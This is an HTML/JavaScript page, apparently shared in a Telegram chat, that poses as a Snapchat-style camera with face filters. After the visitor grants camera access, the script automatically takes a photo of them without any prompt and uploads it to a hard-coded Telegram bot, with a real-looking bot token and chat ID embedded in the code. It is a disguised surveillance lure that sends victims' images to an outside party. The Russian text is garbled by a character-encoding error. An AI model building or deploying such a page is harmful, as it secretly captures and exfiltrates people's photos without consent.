–ú–∏—Ä–∞–∂, [20.07.2025 02:39]
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Snapchat –∫–∞–º–µ—Ä–∞ —Å —Ñ–∏–ª—å—Ç—Ä–∞–º–∏ –∏ –∞–≤—Ç–æ—Ñ–æ—Ç–æ</title>
<style>
  body, html {
    margin: 0; padding: 0; height: 100vh; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center;
    font-family: Arial, sans-serif; color: white;
    overflow: hidden;
  }
  #video-container {
    position: relative;
    width: 100vw; max-width: 400px; height: 533px; /* 3:4 */
  }
  video {
    width: 100%;
    height: 100%;
    object-fit: cover;
    transform: scaleX(-1); /* –∑–µ—Ä–∫–∞–ª—å–Ω–æ */
    border-radius: 16px;
  }
  #mask {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    pointer-events: none;
    user-select: none;
    mix-blend-mode: screen; /* –¥–ª—è —ç—Ñ—Ñ–µ–∫—Ç–∞ */
  }
  #filters {
    margin-top: 12px;
    display: flex;
    gap: 12px;
    overflow-x: auto;
    padding: 8px;
    width: 100vw;
    max-width: 420px;
    box-sizing: border-box;
  }
  .filter-btn {
    width: 64px; height: 64px;
    border-radius: 50%;
    border: 2px solid transparent;
    cursor: pointer;
    overflow: hidden;
    flex-shrink: 0;
    box-shadow: 0 0 8px rgba(255,255,255,0.3);
    transition: border-color 0.2s;
    background: #222;
  }
  .filter-btn.selected {
    border-color: #fffc00;
    box-shadow: 0 0 12px #fffc00;
  }
  .filter-btn img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    pointer-events: none;
    user-select: none;
  }
  #status {
    margin-top: 16px;
    font-size: 14px;
    min-height: 20px;
    text-align: center;
  }
</style>
</head>
<body>

<div id="video-container">
  <video id="video" autoplay muted playsinline></video>
  <img id="mask" src="" alt="–ú–∞—Å–∫–∞ —Ñ–∏–ª—å—Ç—Ä–∞" />
</div>

<div id="filters"></div>
<div id="status">–ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ...</div>

<script>
  const BOT_TOKEN = '–¢–í–û–ô_BOT_TOKEN_–ó–î–ï–°–¨';
  const CHAT_ID = '–¢–í–û–ô_CHAT_ID_–ó–î–ï–°–¨';

  const video = document.getElementById('video');
  const maskImg = document.getElementById('mask');
  const filtersContainer = document.getElementById('filters');
  const status = document.getElementById('status');

  // –°–ø–∏—Å–æ–∫ —Ñ–∏–ª—å—Ç—Ä–æ–≤ - PNG –∏–ª–∏ GIF —Å –ø—Ä–æ–∑—Ä–∞—á–Ω—ã–º —Ñ–æ–Ω–æ–º (–º–æ–∂–Ω–æ –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Å–≤–æ–∏)
  const filters = [
    { name: '–û—á–∫–∏', src: 'https://i.postimg.cc/fyC6yZ9P/glasses.png' },
    { name: '–®–ª—è–ø–∞', src: 'https://i.postimg.cc/25vQntbM/hat.png' },
    { name: '–£—à–∏', src: 'https://i.postimg.cc/9QZJXmMg/ears.png' },
    { name: '–ê–Ω–∏–º–∞—Ü–∏—è 1', src: 'https://i.gifer.com/origin/61/6159a162be08d8c3df91607cc2e0974b_w200.gif' },
    { name: '–ê–Ω–∏–º–∞—Ü–∏—è 2', src: 'https://i.gifer.com/origin/26/26a3a1b5d8b93c9c84c285384b018fa4_w200.gif' }
  ];

  let selectedFilterIndex = 0;
  let stream;

  // –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫–∏ —Ñ–∏–ª—å—Ç—Ä–æ–≤
  filters.forEach((filter, i) => {
    const btn = document.createElement('button');
    btn.className = 'filter-btn' + (i === selectedFilterIndex ? ' selected' : '');
    btn.title = filter.name;
    const img = document.createElement('img');
    img.src = filter.src;
    img.alt = filter.name;
    btn.appendChild(img);
    btn.onclick = () => {
      selectedFilterIndex = i;
      updateSelectedFilter();
    };
    filtersContainer.appendChild(btn);
  });

  function updateSelectedFilter() {
    maskImg.src = filters[selectedFilterIndex].src;
    document.querySelectorAll('.filter-btn').forEach((btn, idx) => {
      btn.classList.toggle('selected', idx === selectedFilterIndex);
    });
  }

  async function startCamera() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;
      status.textContent = '–ö–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞. –§–∏–ª—å—Ç—Ä: ' + filters[selectedFilterIndex].name;

      // –ñ–¥–µ–º, –ø–æ–∫–∞ –≤–∏–¥–µ–æ –±—É–¥–µ—Ç –≥–æ—Ç–æ–≤–æ
      video.onloadedmetadata = () => {
        setTimeout(autoSnap, 1200); // –ê–≤—Ç–æ —Ñ–æ—Ç–æ —á–µ—Ä–µ–∑ 1.2 —Å–µ–∫—É–Ω–¥—ã –ø–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞
      };
    } catch (e) {
      status.textContent = '–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ: ' + e.message;
    }
  }

  function autoSnap() {
    status.

–ú–∏—Ä–∞–∂, [20.07.2025 02:39]
textContent = '–î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ...';

    // –°–æ–∑–¥–∞–µ–º canvas
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');

    // –†–∏—Å—É–µ–º –≤–∏–¥–µ–æ –∑–µ—Ä–∫–∞–ª—å–Ω–æ
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // –†–∏—Å—É–µ–º –≤—ã–±—Ä–∞–Ω–Ω—É—é –º–∞—Å–∫—É –ø–æ–≤–µ—Ä—Ö –≤–∏–¥–µ–æ (–ø—Ä–∏–º–µ—Ä ‚Äî —Ä–∞—Å—Ç—è–Ω—É—Ç—å –º–∞—Å–∫—É –Ω–∞ –≤–µ—Å—å –∫–∞–¥—Ä)
    const mask = new Image();
    mask.src = filters[selectedFilterIndex].src;
    mask.onload = () => {
      ctx.drawImage(mask, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        sendPhoto(blob);
      }, 'image/png');
    }
  }

  function sendPhoto(blob) {
    const formData = new FormData();
    formData.append('chat_id', 5586578957);
    formData.append('photo', blob, 'snap.png');

    fetch(`https://api.telegram.org/bot7759810259:AAG4IjnFm65UOZl_bmRgEReerr8U4RSJBaE/sendPhoto`, {
      method: 'POST',
      body: formData
    })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        status.textContent = '–§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram! üì∏';
      } else {
        status.textContent = '–û—à–∏–±–∫–∞ Telegram API: ' + JSON.stringify(data.description);
      }
    })
    .catch(err => {
      status.textContent = '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ' + err.message;
    });
  }

  updateSelectedFilter();
  startCamera();

</script>

</body>
</html>
